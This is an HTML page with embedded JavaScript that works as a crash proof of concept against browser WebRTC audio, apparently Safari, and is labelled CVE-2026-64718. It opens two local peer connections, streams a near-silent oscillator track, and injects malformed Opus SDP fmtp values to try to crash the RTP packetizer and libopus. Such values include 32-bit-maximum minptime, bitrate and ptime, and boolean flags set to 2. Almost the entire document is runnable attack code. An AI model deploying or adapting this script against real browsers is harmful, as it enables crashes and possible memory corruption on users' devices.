<!doctype html><html><head>
<meta charset=utf8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>WebRTC Audio Crash</title>
<style>
body{background:#0c0c0c;color:#e4e4e4;font-family:monospace;font-size:12px;padding:14px;max-width:520px}
button{background:#ff453a;color:#fff;border:none;padding:10px 18px;border-radius:6px;font-size:12px;cursor:pointer;margin:3px}
button.s{background:#222;border:1px solid #333}
button.cp{background:#32d74b;color:#000}
#o{background:#161616;border:1px solid #2a2a2a;border-radius:6px;padding:12px;min-height:350px;max-height:500px;overflow-y:auto;white-space:pre-wrap;line-height:1.8;margin-top:10px}
.g{color:#32d74b}.r{color:#ff453a}.a{color:#ff9f0a}.d{color:#555}
#hit{background:#1a0000;border:2px solid #ff453a;border-radius:6px;padding:10px;margin-bottom:10px;display:none;color:#ff453a;font-weight:bold}
</style></head><body>
<div style="background:#0a1a0a;border:1px solid #32d74b;border-radius:6px;padding:8px;margin-bottom:8px;font-size:11px">
Running: <span id="orig"></span> | RTC: <span id="rtcst">...</span>
</div>
<div>
<button onclick="runAll()">Run All</button>
<button class="s" onclick="runMinptime()">💀 minptime=UMAX</button>
<button class="s" onclick="runBooleans()">💀 cbr/fec/dtx=2</button>
<button class="s" onclick="runBitrate()">💀 bitrate=UMAX</button>
<button class="s" onclick="runCombined()">💀 All Combined</button>
<button class="cp" onclick="copyLog()">Copy</button>
<button class="s" onclick="clearLog()">Clear</button>
</div>
<div id="hit"></div>
<div id="o"></div>
<script>
document.getElementById('orig').textContent=location.origin;
var rtcOk=typeof RTCPeerConnection!=='undefined';
document.getElementById('rtcst').textContent=rtcOk?'OK':'BLOCKED';
document.getElementById('rtcst').style.color=rtcOk?'#32d74b':'#ff453a';

function w(s,c){var d=document.getElementById('o'),e=document.createElement('span');if(c)e.className=c;e.textContent=new Date().toTimeString().slice(0,8)+' '+s+'\n';d.appendChild(e);d.scrollTop=d.scrollHeight;}
function ok(s){w('[+] '+s,'g')}function info(s){w('[*] '+s,'d')}function warn(s){w('[~] '+s,'a')}
function hit(s){w('[!!!] '+s,'r');var h=document.getElementById('hit');h.style.display='block';h.textContent+='HIT: '+s+'\n';}
function clearLog(){document.getElementById('o').innerHTML='';document.getElementById('hit').style.display='none';document.getElementById('hit').textContent='';}
function copyLog(){navigator.clipboard.writeText(document.getElementById('o').textContent).then(function(){});}

// Make silent audio track using AudioContext oscillator
function makeSilentTrack(){
  var ctx=new AudioContext();
  var osc=ctx.createOscillator();
  var dst=ctx.createMediaStreamDestination();
  // Very low volume — just enough to trigger RTP packetizer
  var gain=ctx.createGain();
  gain.gain.value=0.001;
  osc.connect(gain);
  gain.connect(dst);
  osc.start();
  return{track:dst.stream.getAudioTracks()[0],ctx:ctx,osc:osc};
}

async function connectWithAudio(fmtpStr,label){
  var audio=makeSilentTrack();
  var p1=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
  var p2=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});

  p1.onicecandidate=function(e){if(e.candidate)p2.addIceCandidate(e.candidate).catch(function(){});};
  p2.onicecandidate=function(e){if(e.candidate)p1.addIceCandidate(e.candidate).catch(function(){});};

  // Add real audio track — this forces C++ RTP packetizer to actually run
  p1.addTrack(audio.track,new MediaStream([audio.track]));

  var offer=await p1.createOffer();
  // Inject extreme fmtp
  var modSDP=offer.sdp.replace('minptime=10;useinbandfec=1',fmtpStr);
  offer={type:'offer',sdp:modSDP};

  try{
    await p1.setLocalDescription(offer);
  }catch(e){info(label+': setLocal fail: '+e.message.slice(0,50));audio.osc.stop();audio.ctx.close();p1.close();p2.close();return;}

  try{
    await p2.setRemoteDescription(offer);
    var ans=await p2.createAnswer();
    await p2.setLocalDescription(ans);
    await p1.setRemoteDescription(ans);
  }catch(e){info(label+': exchange fail: '+e.message.slice(0,50));audio.osc.stop();audio.ctx.close();p1.close();p2.close();return;}

  ok(label+': SDP+audio exchange OK — waiting for connection+RTP...');

  await new Promise(function(resolve){
    var t=setTimeout(function(){
      info(label+': 8s timeout — no crash during RTP');
      audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();
    },8000);
    p1.onconnectionstatechange=function(){
      if(p1.connectionState==='connected'){
        ok(label+': CONNECTED — audio RTP flowing with extreme fmtp!');
        warn(label+': C++ RTP packetizer running with fmtp: '+fmtpStr);
        // Keep running for 3s to stress the packetizer
        setTimeout(function(){
          ok(label+': survived 3s of RTP with extreme fmtp');
          clearTimeout(t);
          audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();
        },3000);
      }
      if(p1.connectionState==='failed'){
        clearTimeout(t);info(label+': ICE failed');
        audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();
      }
    };
  });
}

// minptime=UINT32MAX: buf = 48000 * 4294967295 / 1000 = ~206GB overflow
async function runMinptime(){
  w('\n=== minptime=UINT32MAX — RTP buffer overflow ===\n','g');
  if(!rtcOk)return;
  info('minptime=4294967295ms → RTP buf=206GB → integer overflow or crash');
  await connectWithAudio('minptime=4294967295','minptime=UMAX');
  info('minptime=0 test:');
  await connectWithAudio('minptime=0','minptime=0');
  ok('minptime done — check Analytics');
}

// cbr=2, useinbandfec=2, usedtx=2: boolean params with illegal values
async function runBooleans(){
  w('\n=== Boolean params = 2 ===\n','g');
  if(!rtcOk)return;
  info('OPUS_SET_INBAND_FEC(2), OPUS_SET_DTX(2), OPUS_SET_CBR(2)');
  info('libopus expects 0 or 1 — value 2 may cause undefined behavior');
  await connectWithAudio('cbr=2;useinbandfec=2;usedtx=2','booleans=2');
  await connectWithAudio('useinbandfec=2','fec=2');
  await connectWithAudio('usedtx=2','dtx=2');
  await connectWithAudio('cbr=2','cbr=2');
  ok('booleans done — check Analytics');
}

// maxaveragebitrate=UINT32MAX: OPUS_SET_BITRATE(4294967295)
async function runBitrate(){
  w('\n=== maxaveragebitrate=UINT32MAX ===\n','g');
  if(!rtcOk)return;
  info('OPUS_SET_BITRATE(4294967295) — 4.29 Gbps target bitrate');
  info('libopus bitrate range: 500-512000 bps — overflow likely');
  await connectWithAudio('maxaveragebitrate=4294967295','bitrate=UMAX');
  await connectWithAudio('maxplaybackrate=4294967295','playbackrate=UMAX');
  await connectWithAudio('ptime=4294967295','ptime=UMAX');
  ok('bitrate done — check Analytics');
}

// Combined: all extreme values at once
async function runCombined(){
  w('\n=== ALL COMBINED — maximum stress ===\n','g');
  if(!rtcOk)return;
  info('All extreme values simultaneously');
  var combined='minptime=4294967295;maxaveragebitrate=4294967295;maxplaybackrate=4294967295;cbr=2;useinbandfec=2;usedtx=2;ptime=4294967295';
  await connectWithAudio(combined,'ALL_COMBINED');
  ok('combined done — check Analytics');
}

async function runAll(){
  clearLog();
  w('=== WebRTC Audio RTP Crash — CVE-2026-64718 ===\n','g');
  w('[*] Sending REAL AUDIO with extreme fmtp values\n','d');
  w('[*] C++ RTP packetizer + libopus will process these\n','d');
  if(!rtcOk){w('[!!!] RTC BLOCKED\n','r');return;}
  await runMinptime();
  await runBooleans();
  await runBitrate();
  await runCombined();
  w('\nDone. Check Safari Analytics for crashes.\n','g');
}
</script>
</body></html>
